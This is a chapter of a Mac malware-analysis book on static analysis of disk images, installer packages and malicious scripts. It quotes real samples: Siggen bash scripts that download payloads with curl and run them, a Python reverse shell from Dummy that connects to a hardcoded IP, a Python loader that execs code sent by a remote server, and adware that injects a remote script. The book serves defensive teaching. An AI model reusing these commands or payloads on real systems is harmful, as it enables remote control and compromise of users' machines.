<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 4: Nonbinary Analysis</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_69" title="69"/>4</span><br/>
<span class="ChapterTitle">Nonbinary Analysis</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">This chapter focuses on the static analysis of nonbinary file formats, such as packages, disk images, and scripts, that you’ll commonly encounter while analyzing Mac malware. Packages and disk images are compressed file formats often used to deliver malware to a user’s system. When we come across these compressed file types, our goal is to extract their contents, including any malicious files. These files, for example a malware’s installer, can come in various formats, though most commonly as either scripts or compiled binaries (often within an application bundle). Because of their plaintext readability, scripts are rather easy to manually analyze, though malware authors often attempt to complicate the analysis by applying obfuscation techniques. On the other hand, compiled binaries are not readily understandable by humans. Analyzing such files requires both an understanding of the macOS binary file format as well as the use of specific binary analysis tools. Subsequent chapters will cover these topics. </p>
<p><span epub:type="pagebreak" id="Page_70" title="70"/>More often than not, the static analysis of a file starts with determining the file type. This first step is essential, as the majority of static analysis tools are file-type specific. For example, if we identify a file as a package or disk image, we’ll then leverage tools capable of extracting components from these compressed installation media. On the other hand, if the file turns out to be a compiled binary, we must instead use binary-specific analysis tools to assist our analysis efforts. </p>
<h2 id="h1-501942c04-0001">Identifying File Types</h2>
<p class="BodyFirst">As noted, most static analysis tools are file-type specific. Thus, the first step in analyzing a potentially malicious file is identifying its file type. If a file has an extension, the extension will likely identify the file’s type, and this is especially true of extensions used by the operating system to invoke a default action. For example, a malicious disk image without the <em>.dmg</em> extension won’t be automatically mounted if the user double-clicks it, so malware authors are unlikely to remove it.</p>
<p>Often, though, malware authors will attempt to mask the true file type of their creation in order to trick or coerce the user into running it. It goes without saying that looks can be deceiving, and you shouldn’t identify a file’s type solely by its appearance (such as its icon) or what appears to be its file extension. For example, the WindTail malware is specifically designed to masquerade as a benign Microsoft Office document. In reality, the file is a malicious application that, when executed, will persistently infect the system. </p>
<p>At the other end of the spectrum, malicious files may have no icon or file extension. Moreover, a cursory triage of the contents of such files may provide no clues about the file’s actual type. For example, <a href="#listing4-1" id="listinganchor4-1">Listing 4-1</a> is a suspected malicious file, simply named <em>5mLen</em>, of some unknown binary format.</p>
<pre><code>% <b>hexdump -C 5mLen</b><br/>00000000  03 f3 0d 0a 97 93 55 5b  63 00 00 00 00 00 00 00  |......U[c.......|<br/>00000010  00 03 00 00 00 40 00 00  00 73 36 00 00 00 64 00  |.....@...s6...d.|<br/>00000020  00 64 01 00 6c 00 00 5a  00 00 64 00 00 64 01 00  |.d..l..Z..d..d..|<br/>00000030  6c 01 00 5a 01 00 65 00  00 6a 02 00 65 01 00 6a  |l..Z..e..j..e..j|<br/>00000040  03 00 64 02 00 83 01 00  83 01 00 64 01 00 04 55  |..d........d...U|<br/>00000050  64 01 00 53 28 03 00 00  00 69 ff ff ff ff 4e 73  |d..S(....i....Ns|<br/>00000060  d8 08 00 00 65 4a 79 64  56 2b 6c 54 49 6a 6b 55  |....eJydV+lTIjkU|<br/>00000070  2f 38 35 66 51 56 47 31  53 33 71 4c 61 52 78 6e  |/85fQVG1S3qLaRxn|<br/>00000080  6e 42 6d 6e 4e 6c 73 4f  6c 2b 41 67 49 71 43 67  |nBmnNlsOl+AgIqCg|</code></pre>
<p class="CodeListingCaption"><a id="listing4-1">Listing 4-1</a>: An unknown file type </p>
<p>So how can we effectively identify a file’s format? One great option is macOS’s built-in <code>file</code> command. For example, running the <code>file</code> command on the unknown <em>5mLen</em> file identifies the file’s type as byte-compiled Python code (<a href="#listing4-2" id="listinganchor4-2">Listing 4-2</a>):</p>
<pre><code>% <b>file 5mLen</b> <br/>5mLen: python 2.7 byte-compiled</code></pre>
<p class="CodeListingCaption"><a id="listing4-2">Listing 4-2</a>: Using <code>file</code> to identify a byte-compiled Python script </p>
<p><span epub:type="pagebreak" id="Page_71" title="71"/>More on this adware soon, but knowing that a file is byte-compiled Python code allows us to leverage various tools <em>specific to this file format</em>; for example, we can reconstruct a readable representation of the original Python code using a Python decompiler.</p>
<p>Returning to WindTail, we can again use the <code>file</code> utility to reveal that the malicious files (which recall, used icons in an attempt to masquerade as harmless Office documents), are actually application bundles containing 64-bit Mach-O executables (<a href="#listing4-3" id="listinganchor4-3">Listing 4-3</a>):</p>
<pre><code>% <b>file Final_Presentation.app/Contents/MacOS/usrnode</b> <br/>Final_Presentation.app/Contents/MacOS/usrnode: Mach-O 64-bit executable x86_64</code></pre>
<p class="CodeListingCaption"><a id="listing4-3">Listing 4-3</a>: Using <code>file</code> to identify a compiled 64-bit Mach-O executable (WindTail)</p>
<p>Note that the <code>file</code> utility sometimes doesn’t identify a file’s type in a very helpful way. For example, it often misidentifies disk images (<em>.dmg</em>), which can be compressed, as simply <code>VAX COFF</code> files. In this case, other tools such as WhatsYourSign may be of more assistance.<sup class="endnote"><a href="#c04-endnote-1" id="c04-noteref-1">1</a></sup></p>
<p>I wrote WhatsYourSign (WYS) as a free, open source tool primarily designed to display cryptographic signing information, but it also can identify file types. Once you’ve installed WYS, it adds a context menu option to Finder. This allows you to <span class="KeyCaps">ctrl</span>-click any file, then select the <b>Signing Info</b> option in the drop-down context menu to view its type. For example, WYS can readily identify WindTail’s true type: a standard application (<a href="#figure4-1" id="figureanchor4-1">Figure 4-1</a>).</p>
<figure>
<img alt="WhatsYourSign’s Signing Info screen shows WindTail information, including “Item Type: Application,” “Hashes: View Hashes” (a clickable link), “Entitled: None,” and “Sign Auths: Unavailable, as certificate has been revoked”" class="keyline" src="image_fi/501942c04/f04001.png"/>
<figcaption><p><a id="figure4-1">Figure 4-1</a>: Using WhatsYourSign to identify an application (WindTail)</p></figcaption>
</figure>
<p>Besides providing a convenient way to determine a file’s type via the macOS user interface, WYS can also identify file types that the command line <code>file</code> tool may struggle with, such as disk images. Take the example in <a href="#listing4-4" id="listinganchor4-4">Listing 4-4</a>, in which we run <code>file</code> on a disk image trojanized with EvilQuest:</p>
<pre><code>% <b>file "EvilQuest/Mixed In Key 8.dmg"</b><br/>EvilQuest/Mixed In Key 8.dmg: zlib compressed data</code></pre>
<p class="CodeListingCaption"><a id="listing4-4">Listing 4-4</a>: With disk images, <code>file</code> struggles (EvilQuest)</p>
<p>The <code>file</code> tool rather unhelpfully responds with <code>zlib compressed data</code>. While this is technically true (a disk image <em>is </em>compressed data), the output from WYS is more helpful. As you can see in <a href="#figure4-2" id="figureanchor4-2">Figure 4-2</a>, it lists the item type as “Disk Image.”</p>
<span epub:type="pagebreak" id="Page_72" title="72"/><figure>
<img alt="WhatsYourSign’s Signing Info screen shows Evil Quest information, including “Item Type: Disk Image” and “Sign Auths: unsigned (‘errSecCSUnsigned’).”" class="keyline" src="image_fi/501942c04/f04002.png"/>
<figcaption><p><a id="figure4-2">Figure 4-2</a>: Using WYS to identify a disk image (EvilQuest)</p></figcaption>
</figure>
<h2 id="h1-501942c04-0002">Extracting Malicious Files from Distribution Packaging</h2>
<p class="BodyFirst">After identifying an item’s file type, you’ll often continue static analysis with the assistance of tools specific to the identified file type. For example, if an item turns out to be a disk image or an installer package, you can leverage tools designed specifically to extract the files from these distribution mechanisms. Let’s take a look at this now. </p>
<h3 id="h2-501942c04-0001">Apple Disk Images (.dmg)</h3>
<p class="BodyFirst">Apple Disk Images (<em>.dmg</em>) are a popular way to distribute software to Mac users. Of course, there is nothing stopping malware authors from leveraging this software distribution format too. </p>
<p>You can generally identify disk images by their file extension, <em>.dmg</em>. Malware authors will rarely change this extension because, when the user double-clicks any file with a <em>.dmg</em> extension, the operating system will automatically mount it and display its contents, which is often what malware authors want. Alternatively, you can use WYS to identify this file type, as the <code>file</code> tool may struggle to conclusively identify such disk images. </p>
<p>For analysis purposes, we can manually mount an Apple Disk Image via macOS’s built-in <code>hdiutil</code> command, which allows us to examine the disk image structure and extract the files’ contents, such as a malicious installer or application, for analysis. When invoked with the <code>attach</code> option, <code>hdiutil</code> will mount the disk image to the <em>/Volumes</em> directory. As an example, <a href="#listing4-5" id="listinganchor4-5">Listing 4-5</a> mounts a trojanized disk image via the command <code>hdiutil attach</code>: </p>
<pre><code>% <b>hdiutil attach CreativeUpdate/Firefox\ 58.0.2.dmg</b> <br/>  /dev/disk3s2  Apple_HFS  /Volumes/Firefox</code></pre>
<p class="CodeListingCaption"><a id="listing4-5">Listing 4-5</a>: Using <code>hdiutil</code> to mount an infected disk image (CreativeUpdate)</p>
<p>Once the disk image has been mounted, <code>hdiutil</code> displays the mount directory (for example, <em>/Volumes/Firefox</em>). You can now directly access the files within the disk image. Browsing this mounted disk image, either via the terminal (with <code>cd /Volumes/Firefox</code>) or the user interface, reveals a Firefox application, trojanized with the CreativeUpdate malware. For more details on the <em>.dmg</em> file format, see “Demystifying the DMG File Format.”<sup class="endnote"><a href="#c04-endnote-2" id="c04-noteref-2">2</a></sup></p>
<h3 id="h2-501942c04-0002"><span epub:type="pagebreak" id="Page_73" title="73"/>Packages (.pkg)</h3>
<p class="BodyFirst">Another common file format that attackers often abuse to distribute Mac malware is the ubiquitous macOS package. Like with a disk image, the output from the <code>file</code> utility when examining a package may be somewhat confusing. Specifically, it may identify the package as a compressed <em>.xar</em> archive, the underlying file format of packers. From an analysis point of view, it’s far more helpful to know it is a package.</p>
<p>WYS can more accurately identify such files as packages. Moreover, when distributed, packages will end with the <em>.pkg</em> or <em>.mpkg</em> file extensions. These extensions ensure that macOS will automatically launch the package when, for example, a user double-clicks it. Packages can also be signed, a fact that can provide insight during analysis. For example, if a package is signed by a reputable company (such as Apple), the package and its contents are likely benign.</p>
<p>As with disk images, you generally won’t be interested in the package per se, but rather its contents. Our goal, therefore, is to extract the contents of the package for analysis. Since packages are compressed archives, you’ll need a tool to decompress and examine or extract the package’s contents. If you are comfortable using the terminal, macOS’s built-in <code>pkgutil</code> utility can extract the contents of a package via the <code>--expand-full</code> command line option. Another option is the free Suspicious Package application, which, as explained by its documentation, lets you open and explore macOS installer packages without having to install them first.<sup class="endnote"><a href="#c04-endnote-3" id="c04-noteref-3">3</a></sup> Specifically, Suspicious Package allows you to examine package metadata, such as code-signing information, as well as browse, view, and export any files found within the package.</p>
<p>As an example, let’s use Suspicious Package to explore a package containing the CPUMeaner malware (<a href="#figure4-3" id="figureanchor4-3">Figure 4-3</a>).</p>
<figure>
<img alt="Suspicious Package’s Package Info tab shows information for the CPUMeaner malware, mosx3.pkg. The information is as follows: “Installs 2 items—332 KB on disk,” “REVOKED: Claims to be signed by ‘Developer ID Installer: Artur Nurgaliev (DEWCRD3789),’” “Runs 2 install scripts,” “Downloaded by Safari—today at 9:04 pm,” and “Found one critical issue for review.”" class="" src="image_fi/501942c04/f04003.png"/>
<figcaption><p><a id="figure4-3">Figure 4-3</a>: Using Suspicious Package to examine a package (CPUMeaner)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_74" title="74"/>Suspicious Package’s Package Info tab provides general information about the package, including:</p>
<ul>
<li>That it installs two items</li>
<li>That its certificate has been revoked by Apple (a critical issue and large red flag, likely indicating it contains malicious code)</li>
<li>That it runs two install scripts</li>
</ul>
<p>The All Files tab (<a href="#figure4-4" id="figureanchor4-4">Figure 4-4</a>) reveals the directories and files the package would install if it ran. Plus, this tab allows us to export any of these items. </p>
<figure>
<img alt="Suspicious Package’s All Files tab shows the files CPUMeaner’s mosx3.pkg would install: Library▶Application Support▶CpuCooler▶cpucooler. The CpuCooler folder contains the executable cpucooler, which can be exported." class="keyline" src="image_fi/501942c04/f04004.png"/>
<figcaption><p><a id="figure4-4">Figure 4-4</a>: Using Suspicious Package to export a file (CPUMeaner)</p></figcaption>
</figure>
<p>Packages often contain pre- and post-install bash scripts that may contain additional logic required to complete the installation. As these files are automatically executed during installation, you should always check for and examine these files when analyzing a potentially malicious package! Malware authors are quite fond of abusing these scripts to perform malicious actions, such as persistently installing their code.</p>
<p>Indeed, clicking the All Scripts tab reveals a malicious post-install script (<a href="#figure4-5" id="figureanchor4-5">Figure 4-5</a>).</p>
<p>As you can see, CPUMeaner’s post-install script contains an embedded launch agent property list and commands to configure and write to the file <em>/Library/LaunchAgents/com.osxext.cpucooler.plist</em>. Once this property list has been installed, the malware’s binary, <em>/Library/Application Support/CpuCooler/cpucooler</em>, will be automatically started each time the user logs in. </p>
<span epub:type="pagebreak" id="Page_75" title="75"/><figure>
<img alt="Suspicious Package’s All Scripts tab contains CPUMeaner’s post-install script. The script includes the identifier (com.osxext.cpucooler), install location, launch agent property list (/Library/LaunchAgents/$IDENTIFIER.plist), and commands to write to the identifier file." class="keyline" src="image_fi/501942c04/f04005.png"/>
<figcaption><p><a id="figure4-5">Figure 4-5</a>: Using Suspicious Package to examine a post-install script (CPUMeaner)</p></figcaption>
</figure>
<p>In a write-up titled “Pass the AppleJeus,” I highlighted another example of a malicious package, this time belonging to the Lazarus Group.<sup class="endnote"><a href="#c04-endnote-4" id="c04-noteref-4">4</a></sup> As the malicious package is contained within an Apple disk image, the <em>.dmg</em> must first be mounted. As shown in <a href="#listing4-6" id="listinganchor4-6">Listing 4-6</a>, we first mount the malicious disk image, <em>JMTTrader_Mac.dmg</em>. Once it’s mounted to <em>/Volumes/JMTTrader/</em>, we can list its files. We observe it contains a single package, <em>JMTTrader.pkg</em>: </p>
<pre><code>% <b>hdiutil attach JMTTrader_Mac.dmg</b><br/>...<br/>/dev/disk3s1 /Volumes/JMTTrader<br/><br/>% <b>ls /Volumes/JMTTrader/</b><br/>JMTTrader.pkg</code></pre>
<p class="CodeListingCaption"><a id="listing4-6">Listing 4-6</a>: Listing a disk image’s files (AppleJeus)</p>
<p>Once the disk image has been mounted, we can access and examine the malicious package (<em>JMTTrader.pkg</em>), again via Suspicious Package (<a href="#figure4-6" id="figureanchor4-6">Figure 4-6</a>).</p>
<figure>
<img alt="Suspicious Package’s Package Info tab contains information for JMTTrader.pkg as follows: “Installer Package,” “Installs 132 items—31.8 MB on disk,” “Not signed,” “Runs 1 install script.”" class="" src="image_fi/501942c04/f04006.png"/>
<figcaption><p><a id="figure4-6">Figure 4-6</a>: Using Suspicious Package to examine a package (AppleJeus)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_76" title="76"/>The package is unsigned (which is rather unusual) and contains the following post-install script containing the malware’s installation logic (<a href="#listing4-7" id="listinganchor4-7">Listing 4-7</a>):</p>
<pre><code>#!/bin/sh<br/>mv /Applications/JMTTrader.app/Contents/Resources/.org.jmttrading.plist   <br/>   /Library/LaunchDaemons/org.jmttrading.plist<br/><br/>chmod 644 /Library/LaunchDaemons/org.jmttrading.plist<br/>mkdir /Library/JMTTrader<br/><br/>mv /Applications/JMTTrader.app/Contents/Resources/.CrashReporter <br/>   /Library/JMTTrader/CrashReporter<br/><br/>chmod +x /Library/JMTTrader/CrashReporter<br/><br/>/Library/JMTTrader/CrashReporter Maintain &amp;</code></pre>
<p class="CodeListingCaption"><a id="listing4-7">Listing 4-7</a>: A post-install script, containing installer logic (AppleJeus)</p>
<p>Examining this post-install script reveals it will persistently install the malware (<em>CrashReporter</em>) as a launch daemon (<em>org.jmttrading.plist</em>). </p>
<h2 id="h1-501942c04-0003">Analyzing Scripts</h2>
<p class="BodyFirst">Once you’ve extracted the malware from its distribution packaging (whether a <em>.dmg</em>, <em>.pkg</em>, <em>.zip</em>, or some other format), it’s time to analyze the actual malware specimen. Generally, such malware is either a script (like a shell script, a Python script, or an AppleScript) or a compiled Mach-O binary. Due to their readability, scripts are often rather trivial to analyze and may require no special analysis tools, so we’ll start there. </p>
<h3 id="h2-501942c04-0003">Bash Shell Scripts</h3>
<p class="BodyFirst">You’ll find various Mac malware specimens written in shell scripting languages. Unless the shell script code has been obfuscated, it’s easy to understand. For example, in <span class="xref" itemid="xref_target_Chapter 3">Chapter 3</span> we took a look at a bash script that the Dummy malware persists as a launch daemon. Recall the script simply executed a handful of Python commands in order to launch an interactive remote shell. </p>
<p>We find a slightly more complex example of a malicious bash script in Siggen.<sup class="endnote"><a href="#c04-endnote-5" id="c04-noteref-5">5</a></sup> Siggen is distributed as a ZIP file containing a malicious, script-based application, <em>WhatsAppService.app</em>. The application was created via the popular developer tool Platypus, which packages up a script into a native macOS application.<sup class="endnote"><a href="#c04-endnote-6" id="c04-noteref-6">6</a></sup> When a “platypussed” application is run, it executes a script aptly named <em>script</em> from the application’s <em>Resources/</em> directory (<a href="#figure4-7" id="figureanchor4-7">Figure 4-7</a>).</p>
<span epub:type="pagebreak" id="Page_77" title="77"/><figure>
<img alt="WhatsAppService’s Contents folder includes two folders, Resources and MacOS. The Resources folder contains a script named script, a PDF named Applcon.icns, MainMenu.nib, and AppSettings.plist" class="keyline" src="image_fi/501942c04/f04007.png"/>
<figcaption><p><a id="figure4-7">Figure 4-7</a>: A script-based payload (Siggen)</p></figcaption>
</figure>
<p>Let’s take a look at this shell script to see what we can learn from it (<a href="#listing4-8" id="listinganchor4-8">Listing 4-8</a>):</p>
<pre><code>echo c2NyZWVuIC1kbSBiYXNoIC1jICdzbGVlcCA1O2tpbGxhbGwgVGVybWluYWwn<span aria-label="annotation1" class="CodeAnnotation">1</span> | base64 -D<span aria-label="annotation2" class="CodeAnnotation">2</span> | sh<br/>curl -s http://usb.mine.nu/a.plist -o ~/Library/LaunchAgents/a.plist <br/>echo Y2htb2QgK3ggfi9MaWJyYXJ5L0xhdW5jaEFnZW50cy9hLnBsaXN0 | base64 -D | sh<br/>launchctl load -w ~/Library/LaunchAgents/a.plist<br/>curl -s http://usb.mine.nu/c.sh -o /Users/Shared/c.sh<br/>echo Y2htb2QgK3ggL1VzZXJzL1NoYXJlZC9jLnNo | base64 -D | sh<br/>echo L1VzZXJzL1NoYXJlZC9jLnNo | base64 -D | sh</code></pre>
<p class="CodeListingCaption"><a id="listing4-8">Listing 4-8</a>: A malicious bash script (Siggen)</p>
<p>You might notice that various parts of the script are obfuscated, such as the long gibberish section <span aria-label="annotation1" class="CodeAnnotation">1</span>. We can identify the obfuscation scheme as base64, since the script pipes the obfuscated strings to macOS’s <code>base64</code> command (along with the decode flag, <code>-D</code>) <span aria-label="annotation2" class="CodeAnnotation">2</span>. Using the same <code>base64</code> command, we can manually decode and thus fully deobfuscate the script. </p>
<p>Once these encoded script snippets are decoded, it is easy to comprehensively understand the script. The first line, <code>echo c2NyZ...Wwn | base64 -D | sh</code>, decodes and executes <code>screen -dm bash -c 'sleep 5;killall Terminal'</code>, which effectively kills any running instances of <em>Terminal.app</em>, likely as a basic anti-analysis technique. Then, via <code>curl</code>, the malware downloads and persists a launch agent named <em>a.plist. </em>Next, it decodes and executes another obfuscated command. The deobfuscated command, <code>chmod +x ~/Library/LaunchAgents/a.plist</code>, unnecessarily sets the launch agent property list to be executable. This property list is then loaded via the <code>launchctl load</code> command. The malware then downloads another file, another script named <em>c.sh</em>. Decoding the final two lines reveals that the malware first sets this script to be executable, and then executes it.</p>
<p><span epub:type="pagebreak" id="Page_78" title="78"/>And what does the <em>/Users/Shared/c.sh</em> script do? Let’s take a peek (<a href="#listing4-9" id="listinganchor4-9">Listing 4-9</a>). </p>
<pre><code>#!/bin/bash<br/>v=$( curl --silent http://usb.mine.nu/p.php | grep -ic 'open' )<br/>p=$( launchctl list | grep -ic "HEYgiNb" )<br/>if [ $v -gt 0 ]; then<br/>if [ ! $p -gt 0 ]; then<br/> echo IyAtKi0gY29kaW5n...AgcmFpc2UK | base64 --decode | python 3<br/>fi</code></pre>
<p class="CodeListingCaption"><a id="listing4-9">Listing 4-9</a>: Another malicious bash script (Siggen)</p>
<p>After connecting to <em>usb.mine.nu/p.php</em>, it checks for a response containing the string <code>'open'</code>. Following this, the script checks if a launch service named <code>HEYgiNb</code> is running. At that point, it decodes a large blob of base64-encoded data and executes it via Python. Let’s now discuss how to statically analyze such Python scripts. </p>
<h3 id="h2-501942c04-0004">Python Scripts</h3>
<p class="BodyFirst">Anecdotally speaking, Python seems to be the preferred scripting language for Mac malware authors, as it is quite powerful, versatile, and natively supported by macOS. Though these scripts often leverage basic encoding and obfuscation techniques aimed at complicating analysis, analyzing malicious Python scripts is still a fairly straightforward endeavor. The general approach is to first decode or deobfuscate the Python script, then read through the decoded code. Though various online sites can help you analyze obfuscated Python scripts, a manual approach works too. Here we’ll discuss both. </p>
<p>Let’s first consider <a href="#listing4-10" id="listinganchor4-10">Listing 4-10</a>, an unobfuscated example: Dummy’s small Python payload (found wrapped in a bash script). </p>
<pre><code>#!/bin/bash<br/>while :<br/>do<br/>      python -c <span aria-label="annotation1" class="CodeAnnotationCode">1</span> 'import socket,subprocess,os; <br/><br/>      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); <br/>    <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> s.connect(("185.243.115.230",1337)); <br/><br/>    <span aria-label="annotation3" class="CodeAnnotationCode2">3</span> os.dup2(s.fileno(),0); <br/>      os.dup2(s.fileno(),1); <br/>      os.dup2(s.fileno(),2); <br/><br/>    <span aria-label="annotation4" class="CodeAnnotationCode2">4</span> p=subprocess.call(["/bin/sh","-i"]);' <br/>      sleep<br/>done</code></pre>
<p class="CodeListingCaption"><a id="listing4-10">Listing 4-10</a>: A malicious Python script (Dummy)</p>
<p><span epub:type="pagebreak" id="Page_79" title="79"/>As this code isn’t obfuscated, understanding the malware’s logic is straightforward. It begins by importing various standard Python modules, such as <code>socket</code>, <code>subprocess</code>, and <code>os </code><span aria-label="annotation1" class="CodeAnnotation">1</span>. It then makes a socket and connection to <code>185.243.115.230</code> on port <code>1337</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>. The file handles for <code>STDIN</code> (<code>0</code>), <code>STDOUT</code> (<code>1</code>), and <code>STDERR</code> (<code>2</code>) are then duplicated, <span aria-label="annotation3" class="CodeAnnotation">3</span> redirecting them to the socket. </p>
<p>The script then executes the shell, <em>/bin/sh</em>, interactively via the <code>-i</code> flag <span aria-label="annotation4" class="CodeAnnotation">4</span>. As the file handles for <code>STDIN</code>, <code>STDOUT</code>, and <code>STDERR</code> have been duplicated to the connected socket, any remote commands entered by the attacker will be executed locally on the infected system, and any output will be sent back through the socket. In other words, the Python code implements a simple, interactive remote shell.</p>
<p>Another piece of macOS malware that is at least partially written in Python is Siggen. As discussed in the previous section, Siggen contains a bash script that decodes a large chunk of base64-encoded data and executes it via Python. <a href="#listing4-11" id="listinganchor4-11">Listing 4-11</a> shows the decoded Python code:</p>
<pre><code># -*- coding: utf-8 -*-<br/>import urllib2<br/>from base64 import b64encode, b64decode<br/>import getpass<br/>from uuid import getnode<br/>from binascii import hexlify<br/><br/>def get_uid():<br/>    return hexlify(getpass.getuser() + "-" + str(getnode()))<br/><br/>LaCSZMCY = "Q1dG4ZUz"<br/>data = { <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>    "Cookie": "session=" + b64encode(get_uid()) + "-eyJ0eXBlIj...ifX0=", <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 <br/>    (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"<br/>} <br/><br/>try:<br/>    request = urllib2.Request("http://zr.webhop.org:1337", headers=data) <br/>    urllib2.urlopen(request).read() <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>except urllib2.HTTPError as ex:<br/>    if ex.code == 404:<br/>      exec(b64decode(ex.read().split("DEBUG:\n")[1].replace("DEBUG--&gt;", ""))) <span aria-label="annotation4" class="CodeAnnotationCode">4</span><br/>    else:<br/>      raise</code></pre>
<p class="CodeListingCaption"><a id="listing4-11">Listing 4-11</a>: A decoded Python payload (Siggen)</p>
<p>Following the imports of a few modules, the script defines a function called <code>get_uid</code>. This subroutine generates a unique identifier based on the user and MAC address of the infected system. The script then builds a dictionary to hold HTTP headers for use in a subsequent HTTP request <span aria-label="annotation1" class="CodeAnnotation">1</span>. The embedded, hardcoded base64-encoded data <code>-eyJ0eXBlIj...ifX0=</code> <span aria-label="annotation2" class="CodeAnnotation">2</span> decodes to a JSON dictionary (<a href="#listing4-12" id="listinganchor4-12">Listing 4-12</a>). </p>
<pre><code><span epub:type="pagebreak" id="Page_80" title="80"/>'{"type": 0, "payload_options": {"host": "zr.webhop.org", "port": 1337}, "loader_options": {"payload_filename": "yhxJtOS", "launch_agent_name": "com.apple.HEYgiNb", "loader_name": "launch_daemon", "program_directory": "~/Library/Containers/.QsxXamIy"}}'</code></pre>
<p class="CodeListingCaption"><a id="listing4-12">Listing 4-12</a>: Decoded configuration data (Siggen)</p>
<p>The script then makes a request to the attacker’s server at <em>http://zr.webhop.org</em> on port <code>1337</code> via the <code>urllib2.urlopen</code> method <span aria-label="annotation3" class="CodeAnnotation">3</span>. It expects the server to respond with a 404 HTTP code, which normally means the requested resource was not found. However, examining the script reveals that the malware expects this response to contain base64-encoded data, which it extracts, decodes, and then executes <span aria-label="annotation4" class="CodeAnnotation">4</span>.</p>
<p>Unfortunately, the <em>http://zr.webhop.org</em> server was no longer serving up this final-stage payload at the time of my analysis in early 2019. However, Phil Stokes, a well-known Mac security researcher, noted that the script “leverages a public post-exploitation kit, <em>Evil.OSX</em>, to install a backdoor.”<sup class="endnote"><a href="#c04-endnote-7" id="c04-noteref-7">7</a></sup> And, of course, the attackers could swap out the remote Python payload anytime to execute whatever they wanted on the infected systems!</p>
<p>As a final example, let’s return to the adware file named <em>5mLen</em>. We discussed it earlier in this chapter when we ran the <code>file</code> tool to determine it was compiled Python code. As Python is an interpreted language, programs written in this language are usually distributed as human-readable scripts. However, these scripts can also be compiled and distributed as Python bytecode, a binary file format. In order to statically analyze the file, you must first decompile the Python bytecode back to a representation of the original Python code. An online resource, such as Decompiler, can perform this decompilation for you.<sup class="endnote"><a href="#c04-endnote-8" id="c04-noteref-8">8</a></sup> Another option is to install the uncomplye6 Python package to locally decompile the Python bytecode.<sup class="endnote"><a href="#c04-endnote-9" id="c04-noteref-9">9</a></sup></p>
<p><a href="#listing4-13" id="listinganchor4-13">Listing 4-13</a> shows the decompiled Python code:</p>
<pre><code># Python bytecode 2.7 (62211)<br/># Embedded file name: r.py<br/># Compiled at: 2018-07-18 14:41:28<br/>import zlib, base64<br/>exec zlib.decompress(base64.b64decode('eJydVW1z2jgQ/s6vYDyTsd3...SeC7f1H74d1Rw=')) <span aria-label="annotation1" class="CodeAnnotationCode">1</span></code></pre>
<p class="CodeListingCaption"><a id="listing4-13">Listing 4-13</a>: Decompiled Python code (unspecified adware)</p>
<p>Though we now have Python source code, the majority of the code is still obfuscated in what appears to be an encoded string <span aria-label="annotation1" class="CodeAnnotation">1</span>. From the API calls <code>zlib.decompress</code> and <code>base64.b64decode</code>, we can conclude that the original source code has been base64-encoded and zlib-compressed in order to (slightly) complicate static analysis.</p>
<p>The easiest way to deobfuscate the code is via the Python shell interpreter. We can convert the <code>exec</code> statement to a <code>print</code> statement, then have the interpreter fully deobfuscate the code for us (<a href="#listing4-14" id="listinganchor4-14">Listing 4-14</a>):</p>
<pre><code>% <b>python</b><b> </b><br/>&gt; <b>import zlib, base64</b><br/>&gt; <b>print zlib.decompress(base64.b64decode(eJydVW1z2jgQ/s6vYDyTsd3...SeC7f1H74d1Rw='))</b><br/><span epub:type="pagebreak" id="Page_81" title="81"/>from subprocess import Popen,PIPE<br/>...<br/>class wvn:<br/>  def __init__(wvd,wvB): <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>  wvd.wvU()<br/>  wvd.B64_FILE='ij1.b64'<br/>  wvd.B64_ENC_FILE='ij1.b64.enc'<br/>  wvd.XOR_KEY="1bm5pbmcKc" <br/>  wvd.PID_FLAG="493024ui5o" <br/>  wvd.PLAIN_TEXT_SCRIPT=''<br/>  wvd.SLEEP_INTERVAL=60<br/>  wvd.URL_INJECT="https://1049434604.rsc.cdn77.org/ij1.min.js"<br/>  wvd.MID=wvd.wvK(wvd.wvj())<br/><br/>  def wvR(wvd):<br/>    if wvc(wvd._args)&gt;0:<br/>      if wvd._args[0]=='enc99':<br/>        pass<br/>    elif wvd._args[0].startswith('f='): <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>    try:<br/>      wvd.B64_ENC_FILE=wvd._args[0].split('=')[1] <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>    except:<br/>      pass<br/><br/>  def wvY(wvd):<br/>    with wvS(wvd.B64_ENC_FILE)as f:<br/>      wvd.PLAIN_TEXT_SCRIPT=f.read().strip()<br/>      wvd.PLAIN_TEXT_SCRIPT=wvF(wvd.wvq(wvd.PLAIN_TEXT_SCRIPT))<br/>      wvd.PLAIN_TEXT_SCRIPT=wvd.PLAIN_TEXT_SCRIPT.replace("pid_REPLACE",wvd.PID_FLAG)<br/>      wvd.PLAIN_TEXT_SCRIPT=wvd.PLAIN_TEXT_SCRIPT.replace("script_to_inject_REPLACE",<br/>                                                          wvd.URL_INJECT)<br/>      wvd.PLAIN_TEXT_SCRIPT=wvd.PLAIN_TEXT_SCRIPT.replace("MID_REPLACE",wvd.MID)<br/><br/>  def wvI(wvd):<br/>    p=Popen(['osascript'],stdin=PIPE,stdout=PIPE,stderr=PIPE)<br/>    wvi,wvP=p.communicate(wvd.PLAIN_TEXT_SCRIPT)</code></pre>
<p class="CodeListingCaption"><a id="listing4-14">Listing 4-14</a>: Deobfuscated Python code (unspecified adware) </p>
